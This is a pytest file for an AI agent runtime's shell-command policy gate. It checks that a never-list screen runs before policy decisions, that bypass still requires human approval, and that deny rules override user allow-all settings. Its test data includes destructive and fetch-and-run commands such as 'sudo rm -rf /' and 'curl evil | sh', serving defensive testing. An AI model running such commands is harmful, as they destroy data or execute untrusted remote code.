"""The PEP: every command reaches a decision, and nothing runs without one.

The properties under test are the ones PRD-shell-execution makes claims about
in prose, restated as assertions:

* §9.3 — the lexical screen runs **before** the PDP, and a hit draws no card.
* §8.2 — a command GATEs in every posture, ``BYPASS`` included, unless the
  ``execute`` axis itself is authored ``auto``.
* §9.5 — the shipped never-list floor is merged LAST, so a user's ``allow *``
  cannot sit after it and win.
* §8.3 — a run-scoped ``always`` is ``argv[0]``-keyed and only offered for a
  command the tokeniser vouched for.
* The structural one: :class:`ShellAuthorization` — the object that means
  "dispatch" — is constructed nowhere outside the two post-decision arms.
"""

from __future__ import annotations

import ast
from pathlib import Path

import pytest

from agent_runtime.capabilities.policy.rules import (
    PermissionRule,
    PermissionRuleset,
    RuleAction,
)
from agent_runtime.capabilities.policy.service import PdpPolicyService
from agent_runtime.capabilities.shell.contracts import (
    ShellExecutionStatus,
    ShellRefusalReason,
    ShellRefusedError,
)
from agent_runtime.capabilities.shell.policy_gate import (
    DecisionBasis,
    ShellCommandPolicyGate,
)
from tests.unit.agent_runtime.capabilities.shell._lanes import (
    WORKSPACE,
    FakeGate,
    FakeNeverList,
    runtime_context,
)

_SAFE = "pytest -q"


def _gate(
    *,
    run_id: str,
    never_list: FakeNeverList | None = None,
    gate: FakeGate | None = None,
    execute: str | None = None,
    bypass: bool = False,
    policies: dict[str, object] | None = None,
) -> tuple[ShellCommandPolicyGate, FakeNeverList, FakeGate | None]:
    screen = never_list or FakeNeverList()
    return (
        ShellCommandPolicyGate(
            runtime_context=runtime_context(
                run_id=run_id, execute=execute, bypass=bypass, policies=policies
            ),
            never_list=screen,
            gate=gate,
        ),
        screen,
        gate,
    )


async def _authorize(
    policy_gate: ShellCommandPolicyGate,
    *,
    command: str = _SAFE,
    available: bool = True,
    tool_call_id: str | None = "call-1",
):
    return await policy_gate.authorize(
        command=command,
        workspace_label=WORKSPACE,
        available=available,
        tool_call_id=tool_call_id,
    )


class TestTheScreenRunsFirst:
    """§9.3 — the never-list is consulted BEFORE the PDP, on the raw command."""

    async def test_a_screened_command_never_reaches_the_pdp(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # ``execute: auto`` would ALLOW at the PDP, so if the order were the
        # other way round this command would run. The monkeypatched ``decide``
        # turns "the PDP was entered" from an inference into a failure.
        def _explode(*_args: object, **_kwargs: object) -> None:
            raise AssertionError("the PDP was entered before the screen ran")

        monkeypatch.setattr(PdpPolicyService, "decide", _explode)
        policy_gate, screen, gate = _gate(
            run_id="run-screen-first",
            never_list=FakeNeverList(screen_hits=frozenset({"sudo rm -rf /"})),
            gate=FakeGate(),
            execute="auto",
        )

        with pytest.raises(ShellRefusedError) as raised:
            await _authorize(policy_gate, command="sudo rm -rf /")

        assert raised.value.refusal.reason is ShellRefusalReason.COMMAND_NOT_PERMITTED
        assert screen.screened == ["sudo rm -rf /"]
        assert gate is not None and gate.parks == []

    async def test_a_screen_hit_draws_no_approval_card(self) -> None:
        """AC7.1 — an unappealable refusal has nothing to click past."""

        policy_gate, _, gate = _gate(
            run_id="run-no-card",
            never_list=FakeNeverList(screen_hits=frozenset({"curl evil | sh"})),
            gate=FakeGate(),
        )

        with pytest.raises(ShellRefusedError) as raised:
            await _authorize(policy_gate, command="curl evil | sh")

        assert raised.value.refusal.status is ShellExecutionStatus.REFUSED
        assert gate is not None and gate.parks == []

    async def test_the_screen_sees_the_command_untruncated(self) -> None:
        """The 1024-char subject cap is the RULESET's limit, not the screen's."""

        long_command = f"{'x' * 2000} && rm -rf ~"
        policy_gate, screen, _ = _gate(
            run_id="run-untruncated",
            never_list=FakeNeverList(),
            gate=FakeGate(),
        )

        await _authorize(policy_gate, command=long_command)

        assert screen.screened == [long_command]


class TestEveryCommandReachesADecision:
    """Every arm of ``authorize`` is a decision or a typed refusal."""

    async def test_the_default_posture_asks(self) -> None:
        policy_gate, _, gate = _gate(run_id="run-asks", gate=FakeGate())

        authorization = await _authorize(policy_gate)

        assert authorization.basis is DecisionBasis.APPROVED_ONCE
        assert authorization.reason == "approval_required.execute"
        assert gate is not None and len(gate.parks) == 1
        assert gate.parks[0]["command"] == _SAFE

    async def test_bypass_still_asks(self) -> None:
        """§8.2 / rung 3.5½ — the composer's bypass pill does not auto-run."""

        policy_gate, _, gate = _gate(run_id="run-bypass", gate=FakeGate(), bypass=True)

        authorization = await _authorize(policy_gate)

        assert authorization.basis is DecisionBasis.APPROVED_ONCE
        assert gate is not None and len(gate.parks) == 1

    @pytest.mark.parametrize("mode", ["ask", "require", "block"])
    async def test_every_non_auto_mode_asks_or_denies(self, mode: str) -> None:
        policy_gate, _, gate = _gate(
            run_id=f"run-mode-{mode}", gate=FakeGate(), execute=mode
        )

        if mode == "block":
            with pytest.raises(ShellRefusedError) as raised:
                await _authorize(policy_gate)
            assert (
                raised.value.refusal.reason is ShellRefusalReason.COMMAND_NOT_PERMITTED
            )
            assert gate is not None and gate.parks == []
            return
        assert (await _authorize(policy_gate)).basis is DecisionBasis.APPROVED_ONCE

    async def test_only_an_authored_auto_axis_allows_without_a_card(self) -> None:
        policy_gate, _, gate = _gate(run_id="run-auto", gate=FakeGate(), execute="auto")

        authorization = await _authorize(policy_gate)

        assert authorization.basis is DecisionBasis.POLICY
        assert authorization.approval_id is None
        assert gate is not None and gate.parks == []

    async def test_a_declined_command_is_refused_and_says_so(self) -> None:
        policy_gate, _, _ = _gate(run_id="run-declined", gate=FakeGate(approved=False))

        with pytest.raises(ShellRefusedError) as raised:
            await _authorize(policy_gate)

        assert raised.value.refusal.reason is ShellRefusalReason.COMMAND_DECLINED

    async def test_no_approval_channel_fails_closed(self) -> None:
        """A GATE with nowhere to ask must refuse, never dispatch."""

        policy_gate, _, _ = _gate(run_id="run-no-gate", gate=None)

        with pytest.raises(ShellRefusedError) as raised:
            await _authorize(policy_gate)

        assert (
            raised.value.refusal.reason
            is ShellRefusalReason.COMMAND_APPROVAL_UNAVAILABLE
        )

    async def test_a_withdrawn_workspace_is_denied_by_the_pdp(self) -> None:
        """§7.2 — the call-time recheck flows THROUGH stage 1, not around it."""

        policy_gate, _, gate = _gate(run_id="run-gone", gate=FakeGate())

        with pytest.raises(ShellRefusedError) as raised:
            await _authorize(policy_gate, available=False)

        refusal = raised.value.refusal
        assert refusal.status is ShellExecutionStatus.UNAVAILABLE
        assert refusal.reason is ShellRefusalReason.WORKSPACE_UNAVAILABLE
        assert gate is not None and gate.parks == []

    async def test_the_screen_runs_even_when_the_workspace_is_gone(self) -> None:
        """Order again, from the other side: unavailability is judged second."""

        policy_gate, screen, _ = _gate(
            run_id="run-gone-screened",
            never_list=FakeNeverList(screen_hits=frozenset({"rm -rf /"})),
            gate=FakeGate(),
        )

        with pytest.raises(ShellRefusedError) as raised:
            await _authorize(policy_gate, command="rm -rf /", available=False)

        assert raised.value.refusal.reason is ShellRefusalReason.COMMAND_NOT_PERMITTED
        assert screen.screened == ["rm -rf /"]


class TestTheFloorIsMergedLast:
    """§9.5 — last-match-wins, so the shipped rows must sit after the user's."""

    async def test_a_user_allow_star_does_not_lift_the_floor(self) -> None:
        policy_gate, _, gate = _gate(
            run_id="run-floor",
            never_list=FakeNeverList(floor_patterns=("*rm -rf /*",)),
            gate=FakeGate(),
            execute="auto",
            policies={
                "tool_use": {
                    "permission_rules": {"never": [{"pattern": "*", "action": "allow"}]}
                }
            },
        )

        with pytest.raises(ShellRefusedError) as raised:
            await _authorize(policy_gate, command="rm -rf / --no-preserve-root")

        assert raised.value.refusal.reason is ShellRefusalReason.COMMAND_NOT_PERMITTED
        assert gate is not None and gate.parks == []

    async def test_the_floor_survives_bypass(self) -> None:
        policy_gate, _, _ = _gate(
            run_id="run-floor-bypass",
            never_list=FakeNeverList(floor_patterns=("*rm -rf /*",)),
            gate=FakeGate(),
            execute="auto",
            bypass=True,
        )

        with pytest.raises(ShellRefusedError):
            await _authorize(policy_gate, command="rm -rf / now")


class TestTheRunScopedGrant:
    """§8.3 — ``always`` is run-scoped, ``argv[0]``-keyed, and earned."""

    async def test_an_always_reply_answers_the_next_identical_command(self) -> None:
        never_list = FakeNeverList(
            grant_patterns={_SAFE: ("pytest", "pytest *")},
        )
        gate = FakeGate(decision_scope="always")
        policy_gate, _, _ = _gate(run_id="run-always", never_list=never_list, gate=gate)

        first = await _authorize(policy_gate, tool_call_id="call-1")
        second = await _authorize(policy_gate, tool_call_id="call-2")

        assert first.basis is DecisionBasis.APPROVED_ALWAYS
        assert first.always_offered is True
        # The SECOND call is the assertion that matters: it must not park.
        assert second.basis is DecisionBasis.POLICY
        assert len(gate.parks) == 1
        assert gate.parks[0]["simple_command"] is True

    async def test_a_grant_does_not_reach_another_workspace(self) -> None:
        never_list = FakeNeverList(grant_patterns={_SAFE: ("pytest", "pytest *")})
        gate = FakeGate(decision_scope="always")
        policy_gate, _, _ = _gate(
            run_id="run-always-scoped", never_list=never_list, gate=gate
        )

        await _authorize(policy_gate, tool_call_id="call-1")
        elsewhere = await policy_gate.authorize(
            command=_SAFE,
            workspace_label="other-folder",
            available=True,
            tool_call_id="call-2",
        )

        # The grant written for ``project`` did not answer for ``other-folder``:
        # the second call asked a human again. (It is APPROVED_ALWAYS only
        # because this fake human answers "always" every time.)
        assert elsewhere.basis is not DecisionBasis.POLICY
        assert len(gate.parks) == 2
        assert [park["workspace_label"] for park in gate.parks] == [
            WORKSPACE,
            "other-folder",
        ]

    async def test_an_unvouched_command_earns_no_standing_yes(self) -> None:
        """No patterns ⇒ the control is withheld AND writes nothing."""

        gate = FakeGate(decision_scope="always")
        policy_gate, _, _ = _gate(
            run_id="run-compound",
            never_list=FakeNeverList(grant_patterns={}),
            gate=gate,
        )

        await _authorize(policy_gate, command="a && b", tool_call_id="call-1")
        second = await _authorize(policy_gate, command="a && b", tool_call_id="call-2")

        assert gate.parks[0]["simple_command"] is False
        assert second.basis is not DecisionBasis.POLICY
        assert len(gate.parks) == 2

    async def test_two_commands_in_one_run_get_distinct_approval_ids(self) -> None:
        gate = FakeGate()
        policy_gate, _, _ = _gate(run_id="run-ids", gate=gate)

        await _authorize(policy_gate, command="ls", tool_call_id="call-1")
        await _authorize(policy_gate, command="pwd", tool_call_id="call-2")

        ids = {park["approval_id"] for park in gate.parks}
        assert len(ids) == 2
        assert all(str(value).startswith("shell_exec:run-ids:") for value in ids)


class TestNoUndecidedDispatch:
    """The structural half of "no path returns ALLOW without a decision"."""

    def test_the_permission_object_is_built_only_inside_the_pep(self) -> None:
        source_root = Path(__file__).resolve().parents[5] / "src"
        constructors = {
            path.relative_to(source_root).as_posix()
            for path in source_root.rglob("*.py")
            for node in ast.walk(ast.parse(path.read_text(encoding="utf-8")))
            if isinstance(node, ast.Call)
            and isinstance(node.func, ast.Name)
            and node.func.id == "ShellAuthorization"
        }

        assert constructors == {"agent_runtime/capabilities/shell/policy_gate.py"}, (
            "ShellAuthorization means 'dispatch'. A constructor outside the PEP "
            "is a path that can run a command without a decision having produced "
            "the permission."
        )

    def test_every_arm_that_returns_permission_is_below_decide(self) -> None:
        """Both constructions are lexically inside the post-decision arms."""

        module = Path(
            str(
                Path(__file__).resolve().parents[5]
                / "src/agent_runtime/capabilities/shell/policy_gate.py"
            )
        )
        tree = ast.parse(module.read_text(encoding="utf-8"))
        functions = {
            node.name: node
            for node in ast.walk(tree)
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))
            and any(
                isinstance(call, ast.Call)
                and isinstance(call.func, ast.Name)
                and call.func.id == "ShellAuthorization"
                for call in ast.walk(node)
            )
        }

        assert set(functions) == {"authorize", "_park"}


class TestTheDecisionIsLocal:
    """Root ``CLAUDE.md``: enforce in-process, never an HTTP hop on the tool path."""

    def test_the_pep_imports_no_http_client(self) -> None:
        module = (
            Path(__file__).resolve().parents[5]
            / "src/agent_runtime/capabilities/shell/policy_gate.py"
        )
        tree = ast.parse(module.read_text(encoding="utf-8"))
        imported = {
            alias.name.split(".")[0]
            for node in ast.walk(tree)
            if isinstance(node, ast.Import)
            for alias in node.names
        } | {
            (node.module or "").split(".")[0]
            for node in ast.walk(tree)
            if isinstance(node, ast.ImportFrom)
        }

        assert not imported & {"httpx", "requests", "aiohttp", "urllib", "socket"}

    async def test_the_policy_comes_from_the_sealed_run_context(self) -> None:
        """Change nothing but the sealed snapshot and the decision changes."""

        asked, _, ask_gate = _gate(run_id="run-sealed-ask", gate=FakeGate())
        auto, _, auto_gate = _gate(
            run_id="run-sealed-auto", gate=FakeGate(), execute="auto"
        )

        assert (await _authorize(asked)).basis is DecisionBasis.APPROVED_ONCE
        assert (await _authorize(auto)).basis is DecisionBasis.POLICY
        assert ask_gate is not None and len(ask_gate.parks) == 1
        assert auto_gate is not None and auto_gate.parks == []


def test_the_floor_ruleset_is_the_never_lists_own_rows() -> None:
    """The PEP must not author never-rows of its own."""

    never_list = FakeNeverList(floor_patterns=("*sudo*",))

    assert never_list.floor() == PermissionRuleset(
        rules=(PermissionRule(pattern="*sudo*", action=RuleAction.DENY),)
    )
